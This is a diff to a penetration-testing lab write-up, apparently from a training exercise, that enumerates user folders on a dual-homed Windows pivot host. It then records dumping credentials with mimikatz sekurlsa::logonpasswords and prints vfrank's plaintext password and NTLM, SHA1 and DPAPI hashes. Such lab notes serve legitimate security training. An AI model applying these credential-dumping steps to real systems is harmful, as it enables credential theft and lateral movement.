@@ -121,6 +121,8 @@ Network Card(s):           2 NIC(s) Installed.
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
+Found that it's dual homed: 172.16.5.35 and 172.16.6.35
+
 ```powershell
 mlefay@PIVOT-SRV01 C:\Users\mlefay>ipconfig
 
@@ -143,3 +145,190 @@ Ethernet adapter Ethernet1 2:
    Subnet Mask . . . . . . . . . . . : 255.255.0.0
    Default Gateway . . . . . . . . . :
 ```
+
+Nothing found in `mlefay` users directory.
+
+```powershell
+mlefay@PIVOT-SRV01 C:\Users\mlefay>tree /F
+Folder PATH listing
+Volume serial number is B8B3-0D72
+C:.
+├───.ssh
+│       id_rsa
+│       id_rsa.pub
+│
+├───3D Objects
+├───Contacts
+├───Desktop
+├───Documents
+├───Downloads
+├───Favorites
+│   │   Bing.url
+│   │
+│   └───Links
+├───Links
+│       Desktop.lnk
+│       Downloads.lnk
+│
+├───Music
+├───Pictures
+├───Saved Games
+├───Searches
+└───Videos
+```
+
+Nothing found in `administrator.INLANEFREFIGT` also
+
+```powershell
+mlefay@PIVOT-SRV01 C:\Users\administrator.INLANEFREIGHT>tree /F
+Folder PATH listing
+Volume serial number is B8B3-0D72
+C:.
+├───3D Objects
+├───Contacts
+├───Desktop
+├───Documents
+├───Downloads
+├───Favorites
+│   │   Bing.url
+│   │
+│   └───Links
+├───Links
+│       Desktop.lnk
+│       Downloads.lnk
+│
+├───Music
+├───Pictures
+├───Saved Games
+├───Searches
+└───Videos
+```
+
+Nothing found in `Administrator` also
+
+```powershell
+mlefay@PIVOT-SRV01 C:\Users\Administrator>tree /F
+Folder PATH listing
+Volume serial number is B8B3-0D72
+C:.
+├───3D Objects
+├───Contacts
+├───Desktop
+├───Documents
+├───Downloads
+├───Favorites
+│   │   Bing.url
+│   │
+│   └───Links
+├───Links
+│       Desktop.lnk
+│       Downloads.lnk
+│
+├───Music
+├───Pictures
+├───Saved Games
+├───Searches
+└───Videos
+```
+
+Nothing as well for `apendragon`, `lab_adm`, `Public`, and `vfrank`
+
+```powershell
+├───apendragon
+│   ├───Desktop
+│   ├───Documents
+│   ├───Downloads
+│   ├───Favorites
+│   ├───Links
+│   ├───Music
+│   ├───Pictures
+│   ├───Saved Games
+│   └───Videos
+├───lab_adm
+│   ├───3D Objects
+│   ├───Contacts
+│   ├───Desktop
+│   ├───Documents
+│   ├───Downloads
+│   ├───Favorites
+│   │   │   Bing.url
+│   │   │
+│   │   └───Links
+│   ├───Links
+│   │       Desktop.lnk
+│   │       Downloads.lnk
+│   │
+│   ├───Music
+│   ├───Pictures
+│   ├───Saved Games
+│   ├───Searches
+│   └───Videos
+├───Public
+│   ├───Documents
+│   ├───Downloads
+│   ├───Music
+│   ├───Pictures
+│   └───Videos
+└───vfrank
+    ├───3D Objects
+    ├───Contacts
+    ├───Desktop
+    ├───Documents
+    ├───Downloads
+    ├───Favorites
+    │   │   Bing.url
+    │   │
+    │   └───Links
+    ├───Links
+    │       Desktop.lnk
+    │       Downloads.lnk
+    │
+    ├───Music
+    ├───Pictures
+    ├───Saved Games
+    ├───Searches
+    └───Videos
+```
+
+Got RDP access
+
+![](../screenshots/rdp_pivot_srv.png)
+
+
+**Got vfrank creds via mimikatz sekurlsa::logonpasswords**
+
+**creds**
+username: `vfrank`
+password: `Imply wet Unmasked!`
+
+
+
+```
+Authentication Id : 0 ; 163110 (00000000:00027d26)
+Session           : Service from 0
+User Name         : vfrank
+Domain            : INLANEFREIGHT
+Logon Server      : ACADEMY-PIVOT-D
+Logon Time        : 4/23/2026 8:56:01 AM
+SID               : S-1-5-21-3858284412-1730064152-742000644-1103
+        msv :
+         [00000003] Primary
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
+         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
+         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
+        tspkg :
+        wdigest :
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : vfrank
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : Imply wet Unmasked!
+        ssp :
+        credman :
+```
+
+Here's [complete mimikatz dump](./pivot-srv01-mimikatz-dump.txt)
